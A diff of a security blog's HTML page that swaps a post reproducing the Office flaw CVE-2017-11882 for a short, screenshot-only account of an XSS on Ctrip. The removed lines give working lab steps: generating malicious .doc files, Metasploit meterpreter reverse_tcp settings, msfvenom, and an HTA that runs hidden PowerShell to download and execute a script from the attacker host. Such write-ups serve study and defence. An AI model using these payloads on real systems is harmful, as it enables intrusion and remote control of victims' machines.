@@ -18,11 +18,11 @@
     <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.css">
     <title>
         
-        复现CVE-2017-11882｜sodme&#39;s blog
+        携程一处反射型xss到鸡肋存储型xss｜sodme&#39;s blog
         
     </title>
 
-    <link rel="canonical" href="http://issce.cn/2017/11/24/复现CVE-2017-11882/">
+    <link rel="canonical" href="http://issce.cn/携程一处反射型xss到鸡肋存储型xss.html">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -43,7 +43,7 @@
 <!-- hack iOS CSS :active style -->
 <body ontouchstart="" class="animated fadeIn">
 <!-- Navigation -->
-<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost = "true" data-istags="false
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost = "false" data-istags="false
 " data-ishome = "false" >
     <div class="container-fluid">
         <!-- Brand and toggle get grouped for better mobile display -->
@@ -176,14 +176,14 @@
         <div class="row">
             <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
                 <div class="post-heading">
-                    <h1>复现CVE-2017-11882</h1>
+                    <h1>携程一处反射型xss到鸡肋存储型xss</h1>
                     
-                    <h2 class="subheading">梦想着登上顶峰</h2>
+                    <h2 class="subheading">沉下心来，认真学习</h2>
                     
                     <span class="meta">
                          作者 sodme
                         <span>
-                          日期 2017-11-24
+                          日期 2017-12-11
                          </span>
                     </span>
 					<br/>
@@ -192,11 +192,8 @@
 					</span>
                     <div class="tags text-center">
                         
-                        <a class="tag" href="/tags/#漏洞"
-                           title="漏洞">漏洞</a>
-                        
-                        <a class="tag" href="/tags/#复现"
-                           title="复现">复现</a>
+                        <a class="tag" href="/tags/#"
+                           title=""></a>
                         
                     </div>
                 </div>
@@ -205,7 +202,7 @@
     </div>
     <div class="post-title-haojen">
         <span>
-            复现CVE-2017-11882
+            携程一处反射型xss到鸡肋存储型xss
         </span>
     </div>
 </header>
@@ -216,50 +213,20 @@
         <div class="row">
             <!-- Post Container -->
             <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
-                <h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>受害者：winodws10 x64 office 2016 IP：192.168.142.131<br>攻击者：kali IP：192.168.142.133<br>需要使用到的工具以及脚本文件：<br>koadic: <a href="https://github.com/weiruyi123/koadic" target="_blank" rel="noopener">https://github.com/weiruyi123/koadic</a><br>Evilcg师傅脚本：<a href="https://github.com/Ridter/CVE-2017-11882/" target="_blank" rel="noopener">https://github.com/Ridter/CVE-2017-11882/</a><br>msf脚本：<a href="/images/11882/PS_shell.rb">PS_shell.rb</a></p>
-<h3 id="复现姿势（一）"><a href="#复现姿势（一）" class="headerlink" title="复现姿势（一）"></a>复现姿势（一）</h3><p>使用Evilcg师傅脚本，直接打开计算器</p>
-<p>需要python环境<br>下面的命令 -c 执行命令  -o 导出doc文件<br>命令：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Command_CVE<span class="number">-2017</span><span class="number">-11882.</span>py -c <span class="string">"cmd.exe /c calc.exe"</span> -o test.doc</span><br></pre></td></tr></table></figure></p>
-<p><img src="/images/11882/GIF.gif" alt="0"></p>
-<h3 id="复现姿势（二）"><a href="#复现姿势（二）" class="headerlink" title="复现姿势（二）"></a>复现姿势（二）</h3><p>使用koadic构造poc，维持访问</p>
-<p>进入koadic,设置本地IP以及端口即可</p>
-<p><img src="/images/11882/01.png" alt="01"><br><img src="/images/11882/02.png" alt="02"></p>
-<p>我们可以看到生成了一个链接<br><img src="/images/11882/03.png" alt="03"><br>然后我们依然使用Evilcg师傅的脚本生成一个doc文档<br><img src="/images/11882/04.png" alt="03"><br><img src="/images/11882/05.png" alt="05"><br>可以看到，我们在执行命令的哪里填写了我们构造的poc</p>
-<p>然后可以吧，我们生成的123.doc，放在靶机打开即可。<br><img src="/images/11882/06.png" alt="06"><br><img src="/images/11882/07.png" alt="07"><br>成功获取到session</p>
-<h3 id="复现姿势（三）"><a href="#复现姿势（三）" class="headerlink" title="复现姿势（三）"></a>复现姿势（三）</h3><p>使用msf模块获取session</p>
-<p>本地下载rb模块：</p>
-<p>我们把下载好的rb模块移动到<br>usr/share/metasploit-framework/modules/exploits/windows/目录</p>
-<p><img src="/images/11882/08.png" alt="08"><br>使用msf命令<br><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Use exploits/windows/PS_shell</span><br><span class="line"><span class="keyword">set</span> payload <span class="comment">windows</span>/meterpreter/<span class="comment">reverse_tcp</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">lhost 192.168.142.133</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">lport 4444</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">URIPATH 12</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
-<p><img src="/images/11882/09.png" alt="09"></p>
-<p>再次使用Evilcg师傅的脚本生成一个doc文档<br><img src="/images/11882/10.png" alt="10"></p>
-<p>成功获取session</p>
-<p><img src="/images/11882/11.png" alt="11"><br><img src="/images/11882/12.png" alt="12"></p>
-<h3 id="复现姿势（四）"><a href="#复现姿势（四）" class="headerlink" title="复现姿势（四）"></a>复现姿势（四）</h3><p>msf＋msfvenom＋Evilcg师傅的脚本<br>首先用msfvenom生成reverse.ps1 注意:我靶机是32位的我就生成32位的<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.142</span><span class="number">.133</span> LPORT=<span class="number">1234</span> -f psh-reflection &gt;reverse.ps1</span><br></pre></td></tr></table></figure></p>
-<p><img src="/images/11882/13.png" alt="13"></p>
-<p>Evilcg师傅的脚本有第二种利用方式就是建立一个文件并使用mshta方式下载<br>创建一个文件为１.txt文件，内容为：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HEAD</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"VBScript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">Set</span> objShell = CreateObject(<span class="string">"Wscript.Shell"</span>)</span></span><br><span class="line"><span class="actionscript">objShell.Run <span class="string">"powershell.exe -WindowStyle Hidden -NoP -sta -NonI -c IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.142.133/reverse.ps1');reverse.ps1"</span>, <span class="number">0</span></span></span><br><span class="line"><span class="undefined">self.close</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">demo</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HEAD</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>我们把生成的文件以及建立的文件，放在/var/www/html/下<br><img src="/images/11882/14.png" alt="14"><br>因为有需要下载的地方需要用到web容器，我直接开启了kali里面的apache2<br>开启命令：<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 <span class="literal">start</span></span><br></pre></td></tr></table></figure></p>
-<p>如何查看开启是否成功，直接访问127.0.0.1即可</p>
-<p>继续使用Evilcg师傅的脚本生成doc文档<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Command_CVE<span class="number">-2017</span><span class="number">-11882.</span>py -c <span class="string">"mshta http://192.168.142.133/1.txt"</span> -o test.doc</span><br></pre></td></tr></table></figure></p>
-<p>msf继续启动监听</p>
-<p>把生成好的doc文档放在靶机上运行</p>
-<p><img src="/images/11882/15.gif" alt="15"></p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>每个师傅都是值得学习的对象，思路很广。</p>
-<p>参考文章：<br><a href="https://evi1cg.me/archives/CVE_2017_11882_exp.html" target="_blank" rel="noopener">CVE-2017-11882利用</a><br><a href="https://www.xsafe.org/course/1154.html" target="_blank" rel="noopener">Office内存破坏漏洞CVE-2017-11882 执行任意代码失败了还可DoS PoC已公开</a><br><a href="http://www.xpshell.cn/2017/11/office-0day/" target="_blank" rel="noopener">Office-0day-CVE-2017-11882复现</a><br><a href="https://kylingit.com/blog/cve-2017-11882-%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">CVE-2017-11882 复现 </a></p>
+                <h3 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h3><p>手机端的参数未过滤，导致反射型xss</p>
+<p><img src="/images/web/1.png" alt="xss"></p>
+<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>返回主站，发现弹了个存储型xss</p>
+<p><img src="/images/web/2.png" alt="xss"></p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>开始找了半天，没找到到底插在哪里了，结果在历史记录哪里地方</p>
+<p><img src="/images/web/5.png" alt="xss"></p>
+<p><img src="/images/web/3.png" alt="xss"></p>
+<h3 id="收工"><a href="#收工" class="headerlink" title="收工"></a>收工</h3><p>好好学习，天天向上</p>
 
                 <hr>
                 
 
                 <ul class="pager">
                     
-                    <li class="previous">
-                        <a href="/2017/12/11/OWASP-TOP-10/" data-toggle="tooltip" data-placement="top"
-                           title="OWASP TOP 10">&larr; Previous Post</a>
-                    </li>
-                    
-                    
-                    <li class="next">
-                        <a href="/2017/11/24/来必力评论系统某处邮箱轰炸/" data-toggle="tooltip" data-placement="top"
-                           title="来必力评论系统某处邮箱轰炸">Next Post &rarr;</a>
-                    </li>
                     
                 </ul>
 
@@ -274,7 +241,7 @@
 
             <div class="hidden-xs col-sm-3 toc-col">
                 <div class="toc-wrap">
-                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#环境"><span class="toc-text">环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#复现姿势（一）"><span class="toc-text">复现姿势（一）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#复现姿势（二）"><span class="toc-text">复现姿势（二）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#复现姿势（三）"><span class="toc-text">复现姿势（三）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#复现姿势（四）"><span class="toc-text">复现姿势（四）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#起因"><span class="toc-text">起因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过程"><span class="toc-text">过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#收工"><span class="toc-text">收工</span></a></li></ol>
                 </div>
             </div>
         </div>
@@ -296,11 +263,8 @@
                     </h5>
                     <div class="tags">
                         
-                        <a class="tag" href="/tags/#漏洞"
-                           title="漏洞">漏洞</a>
-                        
-                        <a class="tag" href="/tags/#复现"
-                           title="复现">复现</a>
+                        <a class="tag" href="/tags/#"
+                           title=""></a>
                         
                     </div>
                 </section>
